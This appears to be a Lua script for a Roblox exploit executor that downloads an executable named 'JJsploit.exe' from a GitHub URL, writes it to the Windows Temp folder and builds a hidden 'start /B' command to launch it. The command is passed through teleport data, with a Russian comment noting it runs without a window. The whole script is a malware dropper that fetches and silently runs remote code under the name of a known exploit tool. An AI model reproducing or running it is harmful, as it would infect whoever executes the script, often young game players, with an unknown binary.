local url = "https://github.com/Uodnu250/-oweijfqw-riij/blob/main/JJsploit.exe?raw=true"
local path = "C:\\Windows\\Temp\\JJsploit.exe"

local content = game:HttpGet(url)
writefile(path, content)

if isfile(path) then
    local cmd = 'start "" /B "'..path..'"'  -- /B - запуск без окна
    game:GetService("TeleportService"):TeleportToPlaceInstance(
        game.PlaceId,
        game.JobId,
        nil,
        {cmd = cmd}
    )
end